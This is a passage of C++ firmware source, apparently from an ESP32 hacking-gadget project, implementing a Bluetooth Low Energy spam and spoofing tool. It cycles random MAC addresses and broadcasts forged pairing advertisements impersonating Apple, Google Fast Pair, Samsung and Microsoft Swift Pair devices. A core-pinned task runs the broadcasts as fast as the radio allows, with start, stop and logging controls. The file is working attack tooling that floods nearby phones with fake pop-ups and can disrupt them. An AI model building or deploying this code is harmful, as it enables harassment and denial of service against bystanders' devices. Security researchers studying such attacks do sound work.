rgomez31UAQ/ESP32-DIV_CYD-Gadget/bluetooth_attacks.cpp
    // Stop any current advertising
    esp_ble_gap_stop_advertising();

    // Generate random BLE MAC address
    esp_bd_addr_t addr;
    esp_fill_random(addr, 6);
    addr[0] |= 0xC0;  // Set top 2 bits for BLE random static address type

    // Set random address via raw ESP-IDF (wrapper doesn't handle rapid cycling)
    esp_ble_gap_set_rand_addr(addr);

    // Determine what to broadcast
    int broadcastMode = currentMode;
    int broadcastIdx = 0;
    const char* deviceName = "";

    if (currentMode == MODE_CHAOS) {
        broadcastMode = chaosStep % (MODE_COUNT - 1);
        int count = getDeviceCount(broadcastMode);
        broadcastIdx = (count > 0) ? random(count) : 0;
        chaosStep++;
    } else {
        broadcastIdx = deviceIndex[currentMode];
    }

    // Build payload
    BLEAdvertisementData advData = BLEAdvertisementData();

    switch (broadcastMode) {
        case MODE_APPLE_POPUP:
            getApplePopupPayload(advData, broadcastIdx);
            deviceName = APPLE_NAMES[broadcastIdx % APPLE_COUNT];
            break;

        case MODE_SOUR_APPLE: {
            int randType = random(SOUR_APPLE_COUNT);
            getSourApplePayload(advData, randType);
            deviceName = SOUR_APPLE_NAMES[randType];
            break;
        }

        case MODE_FAST_PAIR:
            getFastPairPayload(advData, broadcastIdx);
            deviceName = FAST_PAIR_NAMES[broadcastIdx % FAST_PAIR_COUNT];
            break;

        case MODE_SAMSUNG_BUDS:
            getSamsungBudsPayload(advData, broadcastIdx);
            deviceName = SAMSUNG_BUDS_NAMES[broadcastIdx % SAMSUNG_BUDS_COUNT];
            break;

        case MODE_SAMSUNG_WATCH:
            getSamsungWatchPayload(advData, broadcastIdx);
            deviceName = SAMSUNG_WATCH_NAMES[broadcastIdx % SAMSUNG_WATCH_COUNT];
            break;

        case MODE_SWIFT_PAIR:
            getSwiftPairPayload(advData, broadcastIdx);
            deviceName = SWIFT_PAIR_NAMES[broadcastIdx % SWIFT_PAIR_COUNT];
            break;

        default:
            return;
    }

    // Set raw advertising data via ESP-IDF (bypasses Arduino wrapper for reliable cycling)
    std::string payload = advData.getPayload();
    esp_ble_gap_config_adv_data_raw((uint8_t*)payload.data(), payload.length());

    // Brief pause for data config to take effect
    delay(1);

    // Start advertising with raw ESP-IDF params (proven pattern from ESP32-BLE-Spam)
    esp_ble_gap_start_advertising(&bleSpamAdvParams);

    // Let BLE controller fire advertising events on channels 37/38/39
    // 20ms = at least one full advertising interval
    delay(20);

    // Stop advertising (clean cycle for next random MAC)
    esp_ble_gap_stop_advertising();

    // Update counters
    packetCount++;
    rateWindowCount++;

    // Log first 5 packets to serial for debugging
    if (packetCount <= 5) {
        Serial.printf("[BLESPOOF] TX #%lu mode=%d len=%d addr=%02X:%02X:%02X\n",
            packetCount, broadcastMode, (int)payload.length(), addr[0], addr[1], addr[2]);
    }

    // Log entry with truncated MAC (all stack-allocated, zero heap allocs)
    char logBuf[42];
    snprintf(logBuf, sizeof(logBuf), "[+] %s -> %02X:%02X:%02X", deviceName, addr[0], addr[1], addr[2]);
    addLogEntry(logBuf, HALEHOUND_VIOLET);
}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 BROADCAST TASK — Runs doBroadcast() as fast as BLE allows
// BLE advertising has inherent ~21ms per cycle (delay(1) + delay(20))
// Removing the 40ms throttle roughly doubles broadcast rate (~45-50/sec)
// ═══════════════════════════════════════════════════════════════════════════

static void spamTxTask(void* param) {
    spamTaskRunning = true;
    unsigned long rateStart = millis();

    while (spamming) {
        // Heap safety — BLEAdvertisementData allocates std::string on heap
        if (esp_get_free_heap_size() < 8192) {
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        doBroadcast();  // Increments packetCount and rateWindowCount

        // Update rate counter every second
        unsigned long now = millis();
        if (now - rateStart >= 1000) {
            currentRate = (uint16_t)rateWindowCount;
            rateWindowCount = 0;
            rateStart = now;
        }

        // Yield — delay(20) in doBroadcast already yields, but belt and suspenders
        vTaskDelay(1);
    }

    spamTaskRunning = false;
    vTaskDelete(NULL);
}

static void startSpamTask() {
    if (spamTaskHandle != NULL) return;
    xTaskCreatePinnedToCore(spamTxTask, "bleSpam", 8192, NULL, 1, &spamTaskHandle, 0);
}

static void stopSpamTask() {
    spamming = false;
    if (spamTaskHandle == NULL) return;

    // Wait for task to finish (500ms timeout)
    unsigned long start = millis();
    while (spamTaskRunning && (millis() - start < 500)) {
        delay(10);
    }

    // Force kill if task didn't exit cleanly
    if (spamTaskRunning) {
        vTaskDelete(spamTaskHandle);
    }

    spamTaskHandle = NULL;
    spamTaskRunning = false;

    // Stop any lingering advertising
    esp_ble_gap_stop_advertising();
}

static void startSpam() {
    spamming = true;
    rateWindowCount = 0;
    addLogEntry("[!] SPAM STARTED", HALEHOUND_HOTPINK);
    drawIconBar();
    drawHeader();
    drawLog();  // Force immediate log display on state change

    startSpamTask();  // Launch Core 0 broadcast engine

    #if CYD_DEBUG
    Serial.printf("[BLESPOOF] Started - Mode: %s (Core 0)\n", MODE_NAMES[currentMode]);
    #endif
}

static void stopSpam() {
    stopSpamTask();  // Stop Core 0 task first
    addLogEntry("[!] SPAM STOPPED", HALEHOUND_HOTPINK);
    drawIconBar();
    drawHeader();

    #if CYD_DEBUG
    Serial.println("[BLESPOOF] Stopped");
    #endif
}

static void toggleSpam() {
    if (spamming) stopSpam(); else startSpam();
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void setInitialMode(int mode) {
    initialMode = mode;
}

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[BLESPOOF] Initializing Multi-Platform BLE Spoofer...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

